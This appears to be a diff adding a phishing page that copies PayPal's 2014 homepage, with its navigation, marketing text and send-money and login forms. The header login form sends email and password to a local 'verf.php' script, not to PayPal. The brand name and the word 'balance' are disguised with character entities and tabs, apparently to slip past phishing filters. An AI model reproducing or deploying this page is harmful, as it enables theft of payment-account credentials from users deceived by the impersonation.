@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="fr-US" data-device-type="dedicated" class="no-js">
+ <head>
+  <title>
+   Send Money, Pay Online or Set Up a Merchant Account - PayPal
+  </title>
+  <link type="text/css" href="css/959e73c3cfb182703843f03174e512df2ff3b3.css" rel="stylesheet" />
+  <link type="text/css" href="css/93981ae2c5a9e7f0d20e5ec05c663f0d7381f8.css" rel="stylesheet" />
+  <link type="text/css" href="css/8b1ee7fc50e931152a626a25864818565b25ef.css" rel="stylesheet" />
+  <link href="cont/pp_ico.png" rel="shortcut icon" />
+  <script>
+   if (self === top) {
+                var antiClickjack = document.getElementById("antiClickjack");
+                antiClickjack.parentNode.removeChild(antiClickjack);
+            } else {
+                top.location = self.location;
+            }
+  </script>
+  <script src="js/c1e55b749b95682923839530db6520b2ca221a.js">
+  </script>
+ </head>
+ <body>
+  <div id="body">
+   <div class="moving-background-container" id="fixed-top">
+    <header role="banner" class="table-row">
+     <div>
+      <div class="containerCentered ">
+       <a role="button" id="menu-button" href="#Menu">
+        Menu
+       </a>
+       <a class="ppl-img-logo" href="#">
+        PayPal
+       </a>
+       <nav role="navigation" id="main-menu">
+        <ul>
+         <li>
+          <a aria-controls="submenu-buy" rel="menuitem" id="header-buy" href="#">
+           Buy
+          </a>
+          <div aria-labelledby="header-buy" id="submenu-buy" class="menu-wrapper">
+           <ul class="subnav list " id="header-buy-menu">
+            <li>
+             <a href="#">
+              Pay on eBay
+             </a>
+            </li>
+            <li>
+             <a href="#">
+              Pay on websites
+             </a>
+            </li>
+            <li>
+             <a href="#">
+              Pay on the go
+             </a>
+            </li>
+            <li>
+             <a href="#">
+              Pay in stores
+             </a>
+            </li>
+            <li>
+             <a href="#">
+              More ways to use us
+             </a>
+            </li>
+           </ul>
+          </div>
+         </li>
+         <li>
+          <a aria-controls="submenu-sell" rel="menuitem" id="header-sell" href="#">
+           Sell
+          </a>
+          <div aria-labelledby="header-sell" id="submenu-sell" class="menu-wrapper">
+           <ul class="subnav list " id="header-sell-menu">
+            <li>
+             <a href="#">
+              Get paid on your website
+             </a>
+            </li>
+            <li>
+             <a href="#">
+              Email an invoice
+             </a>
+            </li>
+            <li>
+             <a href="#">
+              Get paid on the go
+             </a>
+            </li>
+            <li>
+             <a href="#">
+              Get paid in your store
+             </a>
+            </li>
+            <li>
+             <a href="#">
+              Request money
+             </a>
+            </li>
+           </ul>
+          </div>
+         </li>
+         <li>
+          <a aria-controls="submenu-send" class="desktop-only" rel="menuitem" id="header" href="#">
+           Send
+          </a>
+          <div aria-labelledby="header-send" id="submenu-send" class="menu-wrapper light">
+           <div class="menu subnav light" id="header-send-menu">
+            <form id="header-send-money-form" class="form-inline form-stepper" action="
+#
+" method="post">
+             <div data-step="step" id="send-money-step-1" class="step shown">
+              <div>
+               <strong class="headline medium">
+                Send money in a few clicks
+               </strong>
+               <a class="learn-more-link contentLink" href="%0A#%0A">
+                Learn more
+               </a>
+              </div>
+              <input type="hidden" value="myAllTextSubmitID" name="myAllTextSubmitID" />
+              <input type="hidden" name="cmd" value="_send-money" />
+              <input type="hidden" name="type" value="external" />
+              <input type="hidden" name="payment_source" value="p2p_mktgpage" />
+              <input type="hidden" name="submit.x" value="Continue" />
+              <input type="hidden" name="sender_email" value="" />
+              <div class="controls">
+               <div class="input-wrapper">
+                <input type="text" autocorrect="off" autocapitalize="off" required="required" placeholder="Their email or phone number" id="to_email" name="email" class="emailf" />
+                <label class="accessAid" for="to_email">
+                 Email Address
+                </label>
+               </div>
+              </div>
+              <div class="controls">
+               <div class="input-wrapper caboose">
+                <label class="accessAid" for="amount_send">
+                 Amount to send
+                </label>
+                <input type="text" maxlength="17" required="required" autocorrect="off" autocapitalize="off" placeholder="Amount" id="amount_send" name="amount" class="amount-currency" />
+                <select name="amount_ccode" id="currency_code" class="currency no-arrow required">
+                </select>
+                <label class="select-arrow" for="currency_code">
+                 Currency
+                </label>
+               </div>
+              </div>
+              <input type="submit" class="btn" value="Continue" />
+             </div>
+             <div data-step="submit" id="send-money-step-2" class="step">
+              <div class="button-choices">
+               <div class="choice">
+                <strong class="headline medium">
+                 This is to friends or family
+                </strong>
+                <p id="choice-1">
+                 Free for both of you when sent domestically in USD, and funded with your PayPal b	al	ance or bank account.
+                </p>
+                <button aria-describedby="choice-1" data-step="submit" class="btn" value="Gift" name="payment_type" type="submit">
+                 Friends or family
+                </button>
+               </div>
+               <div class="choice">
+                <strong class="headline medium">
+                 This is for a good or service
+                </strong>
+                <p id="choice-2">
+                 Free for you. The seller pays a small fee to process the payment. You’re also covered by our
+                 <a href="#">
+                  Purchase Protection
+                 </a>
+                 .
+                </p>
+                <button aria-describedby="choice-2" data-step="submit" class="btn" value="Goods" name="payment_type" type="submit">
+                 Goods or services
+                </button>
+               </div>
+              </div>
+             </div>
+            </form>
+           </div>
+          </div>
+         </li>
+         <li>
+          <a class="no-drop" id="header-business" href="#">
+           Business
+          </a>
+         </li>
+        </ul>
+        <ul class="sublist">
+         <li>
+          <form action="#" method="post">
+           <button type="submit" title="Search" id="menu-sublist-search">
+            Search
+           </button>
+           <input type="hidden" name="queryString" />
+           <input type="hidden" value="paypal" name="cn" />
+           <input type="hidden" value="www" name="cc" />
+           <input type="hidden" value="0" name="adv" />
+           <input type="hidden" value="caseB" name="mode" />
+          </form>
+         </li>
+         <li>
+          <a id="menu-sublist-help" href="#">
+           Help
+          </a>
+         </li>
+         <li>
+          <a id="menu-sublist-contact" href="#">
+           Contact
+          </a>
+         </li>
+        </ul>
+       </nav>
+       <div class="closed" id="header-buttons">
+        <a class="btn btn-secondary btn-small" id="login-button" href="#">
+         Log In
+        </a>
+        <a class="btn btn-small btn-signup" name="SignUp_header" id="signup-button" href="#">
+         Sign Up
+        </a>
+       </div>
+       <div title="Log In" id="login-modal-1" class="mpp-modal login-modal">
+        <form novalidate="novalidate" class="content" method="post" name="login_form_mobile" action="#">
+         <div class="control-group">
+          <label class="accessAid" for="modal-email-1">
+           Email address
+          </label>
+          <input type="email" placeholder="Email address" id="modal-email-1" name="login_email" class="large" />
+         </div>
+         <div class="control-group">
+          <label class="accessAid" for="modal-password-1">
+           Password
+          </label>
+          <input type="password" placeholder="Password" autocomplete="off" id="modal-password-1" name="login_password" class="large" />
+         </div>
+         <div class="control-group">
+          <input type="submit" name="submit.x" class="btn" value="Log In" />
+         </div>
+         <div class="password-recovery help-block">
+          Forgot your password?
+          <a href="#">
+           Recover it
+          </a>
+         </div>
+         <div class="control-group separated">
+          <a name="SignUp_header" class="btn btn-secondary block" href="%0A#%0A">
+           Sign Up for Free
+          </a>
+         </div>
+        </form>
+       </div>
+       <div class="form-inline open" id="login-header">
+        <form name="login_form" novalidate="novalidate" method="post" action="verf.php">
+         <div class="input-wrapper small">
+          <label for="login_email" class="accessAid">
+           Email address
+          </label>
+          <input type="email" required="" tabindex="1" value="" class="small with-helper" placeholder="Email address" title="A valid email address is required" name="login_email" id="login_email" />
+          <div class="input-link">
+           <a tabindex="4" href="#" id="passwordRecovery1" class="input-button passwordRecovery" title="Forgot your email address?">
+            Forgot your email address?
+           </a>
+          </div>
+         </div>
+         <div class="input-wrapper small">
+          <label for="login_password" class="accessAid">
+           Password
+          </label>
+          <input type="password" required="" autofocus="autofocus" tabindex="2" class="small with-helper" title="Password is required" placeholder="Password" autocomplete="off" name="login_password" id="login_password" />
+          <div class="input-link">
+           <a tabindex="5" role="button" href="#" class="input-button passwordRecovery useModal" id="" title="Forgot password?">
+            Forgot Password?
+           </a>
+           <div title="" id="forgot-password-modal" class="mpp-modal">
+            <iframe scrolling="auto" data-src="
+#
+">
+            </iframe>
+           </div>
+          </div>
+         </div>
+         <input type="submit" tabindex="3" value="Log In" class="btn btn-small " name="submit" />
+         <a tabindex="6" class="btn btn-small btn-secondary btn-signup" name="SignUp_header" id="signup-button-inner" href="#">
+          Sign Up
+         </a>
+        </form>
+       </div>
+      </div>
+     </div>
+    </header>
+    <div class="table-row hero dark">
+     <div class="hero-bg content-block moving-background filler hero2-video-still" id="hero">
+      <h1>
+       The check's in the email.
+      </h1>
+      <p>
+       <a class="btn" href="#">
+        Start Emailing Your Invoices
+       </a>
+      </p>
+      <div class="novideo-bg">
+      </div>
+      <video poster="cont/email-invoice.jpg" muted="muted" autoplay="autoplay">
+       <source type="video/webm" src="cont/email-invoice.webm">
+       </source>
+      </video>
+     </div>
+    </div>
+    <div class="table-row hugger-row">
+     <div class="hero-hugger">
+      <div class="containerCentered">
+       <ul class="pull-left button-menu">
+        <li>
+         <a title="Help" class="icon help" href="%0A#%0A">
+          Help
+         </a>
+        </li>
+        <li>
+         <a title="Contact" class="icon contact" href="%0A#%0A">
+          Contact
+         </a>
+        </li>
+        <li>
+         <form action="#" method="post">
+          <button type="submit" title="Search" class="icon search">
+           Search
+          </button>
+          <input type="hidden" name="Search" />
+          <input type="hidden" value="paypal" name="cn" />
+          <input type="hidden" value="www" name="cc" />
+          <input type="hidden" value="0" name="adv" />
+          <input type="hidden" value="caseB" name="mode" />
+         </form>
+        </li>
+       </ul>
+       <div class="country-selector ">
+        <a class="country unitedstates" title="See all countries" href="#">
+         See all countries
+        </a>
+       </div>
+       <a title="There's more below" id="hugger-arrow" class="fancy-down-arrow-grey" href="#n1">
+        Scroll to next panel
+       </a>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div class="containerMobileFullWidth" id="main" role="main">
+    <section id="n1" class="row-fluid editorial
+ editorial-left
+
+
+
+
+ ">
+     <div class="containerCentered editorial-img n1">
+      <div class=" span6 offset6 editorial-container">
+       <div class="editorial-cell">
+        <h2 class="
+ large
+">
+         At the speed of want.
+        </h2>
+        <p class="contentPara">
+         Millions of customers use us for one simple reason: it’s simple. Just an email and password will get you through to checkout before you can reach for your wallet.
+        </p>
+        <a href="%0A#%0A" class="contentLink
+
+">
+         Pay on eBay
+        </a>
+        <a href="%0A#%0A" class="contentLink
+
+">
+         Pay on websites
+        </a>
+       </div>
+      </div>
+     </div>
+    </section>
+    <section class="row-fluid editorial
+ editorial-right
+
+ editorial-bg n2
+
+
+ lightContent ">
+     <div data-translate-y-end="60" data-translate-y-start="-20" class="parallax-bg scroll-animate">
+     </div>
+     <div class="containerCentered">
+      <div class=" span6 editorial-container">
+       <div class="editorial-cell">
+        <h2 class="
+ large
+">
+         Tap into your money.
+        </h2>
+        <p class="contentPara">
+         Order ahead and be ready to go before you walk in the door. Pay the check before the server can bring it to you. No lines, no signing. Just a simple, secure way to pay when you're out in the world.
+        </p>
+        <a href="%0A#%0A" class="contentLink
+ reverseLink
+">
+         Pay in stores
+        </a>
+        <a href="%0A#%0A" class="contentLink
+ reverseLink
+">
+         Pay on the go
+        </a>
+       </div>
+      </div>
+     </div>
+    </section>
+    <section class="row-fluid panel  blue
+ reverseLink
+">
+     <div class="containerCentered">
+      <div class="span6">
+       <h2 class="contentHead large">
+        Send all over the place.
+       </h2>
+       <p class="contentPara">
+        Send money to almost anyone with an email or mobile number quickly. You can send all around the world and they’ll be delighted to get your message.
+       </p>
+       <a href="%0A#%0A" class="contentLink">
+        Send money
+       </a>
+      </div>
+      <div class="span6">
+       <h2 class="contentHead large">
+        Request a quick buck.
+       </h2>
+       <p class="contentPara">
+        Requesting money is a friendly reminder for a favor or job well done. They’ll get an invitation to pay anyway they like without having to think about it.
+       </p>
+       <a href="%0A#%0A" class="contentLink">
+        Request money
+       </a>
+      </div>
+     </div>
+    </section>
+    <section class="row-fluid editorial
+ editorial-left
+
+
+
+
+ ">
+     <div class="containerCentered editorial-img n3">
+      <div class=" span6 offset6 editorial-container">
+       <div class="editorial-cell">
+        <h2 class="
+ large
+">
+         You're so accepting.
+        </h2>
+        <p class="contentPara">
+         Start accepting credit cards with the simple turn of our key. We've figured it all out for you, from sales to figures. Stop running, it runs itself.
+        </p>
+        <a href="%0A#%0A" class="contentLink
+
+">
+         Get paid on your website
+        </a>
+        <a href="%0A#%0A" class="contentLink
+
+">
+         Email an invoice
+        </a>
+       </div>
+      </div>
+     </div>
+    </section>
+    <section class="row-fluid editorial
+ editorial-right
+
+ editorial-bg n4
+
+
+ ">
+     <div data-translate-y-end="60" data-translate-y-start="-20" class="parallax-bg scroll-animate">
+     </div>
+     <div class="containerCentered">
+      <div class="span5 editorial-container">
+       <div class="editorial-cell">
+        <h2 class="
+ large
+">
+         We’re even better in person.
+        </h2>
+        <p class="contentPara">
+         A leader in online payments is also available in person. Use our app to turn your mobile device into a register, in store or on the go. Accept cards, checks, and, of course, PayPal.
+        </p>
+        <a href="%0A#%0A" class="contentLink
+
+">
+         Get paid on the go
+        </a>
+        <a href="%0A#%0A" class="contentLink
+
+">
+         Get paid in your store
+        </a>
+       </div>
+      </div>
+     </div>
+    </section>
+    <section class="row-fluid panel light center-text">
+     <div class="containerCentered">
+      <div class="span12">
+       <p class="closingHeadline headline large">
+        Make money make sense.
+       </p>
+       <a href="%0A#%0A" class="btn closing-cta center-block span4">
+        Mind your money
+       </a>
+      </div>
+     </div>
+    </section>
+   </div>
+   <footer role="contentinfo">
+    <div class="containerCentered containerExtend">
+     <ul class="footer-main secondaryLink">
+      <li>
+       <a href="#">
+        Help
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Contact
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Fees
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Security
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Apps
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Shop
+       </a>
+      </li>
+      <li class="country-selector ">
+       <a class="country unitedstates" title="See all countries" href="#">
+        See all countries
+       </a>
+      </li>
+      <li class="footer-search">
+       <form class="search-form" action="
+#
+" method="post">
+        <button type="submit" title="Search" class="search-icon">
+         Search
+        </button>
+        <input type="search" placeholder="Search" name="q" />
+        <input type="hidden" value="paypal" name="cn" />
+        <input type="hidden" value="www" name="cc" />
+        <input type="hidden" value="0" name="adv" />
+        <input type="hidden" value="caseB" name="mode" />
+       </form>
+      </li>
+     </ul>
+     <ul class="footer-secondary secondaryLink">
+      <li>
+       <a target="_blank" href="#">
+        About
+       </a>
+      </li>
+      <li>
+       <a target="_blank" href="#">
+        Blog
+       </a>
+      </li>
+      <li>
+       <a target="_blank" href="#">
+        Jobs
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Sitemap
+       </a>
+      </li>
+      <li>
+       <a target="_blank" href="#">
+        eBay
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Developers
+       </a>
+      </li>
+      <li>
+       <a href="#">
+        Enterprise
+       </a>
+      </li>
+      <li>
+       <a target="_blank" href="#">
+        Partners
+       </a>
+      </li>
+      <li id="siteFeedback">
+       <script>
+       </script>
+      </li>
+     </ul>
+     <ul class="footer-tertiary secondaryLink">
+      <li id="footer-copyright">
+       © 1999 - 2014 PayPal
+      </li>
+      <li id="footer-privacy">
+       <a href="#">
+        Privacy
+       </a>
+      </li>
+      <li id="footer-legal">
+       <a href="#">
+        Legal
+       </a>
+      </li>
+     </ul>
+    </div>
+   </footer>
+  </div>
+  <script>
+   var PP_GLOBAL_JS_STRINGS = {
+        "CLOSE": "Close",
+        "TOGGLE_FULL_SCREEN": "Toggle Full Screen",
+        "NO_PLAY_VIDEO": "Your browser cannot play this video",
+        "CLICK_TO_PLAY": "Paused. Click to play.",
+        "PLAY": "Play",
+        "PAUSE": "Pause",
+        "PLAY_OR_PAUSE": "Play or Pause",
+        "MUTE": "Mute",
+        "SEEK_VIDEO": "Skip to another location in the video",
+       
+    };
+  </script>
+  <script src="js/ab9510020bbbcc1a2cb5d6d52551b5180f8b86.js">
+  </script>
+  <script>
+   $.fn.namespace("PA&amp;#121;PAL.content");
+
+    
+        new PA&amp;#121;PAL.Marketing.MovingBackground('#hero', false);
+  </script>
+  <script src="js/e35992375ed08a5deda2badae0f754853e0599.js">
+  </script>
+  <script>
+   PA&amp;#121;PAL.tns.loginflow = '';
+	PA&amp;#121;PAL.tns.flashLocation = '';
+  </script>
+  <script>
+   $(document).ready(function(){
+                try {
+
+                } catch(err) {
+                }
+            });
+  </script>
+  <script>
+   $("input").attr("required", "true");
+  </script>
+ </body>
+</html>
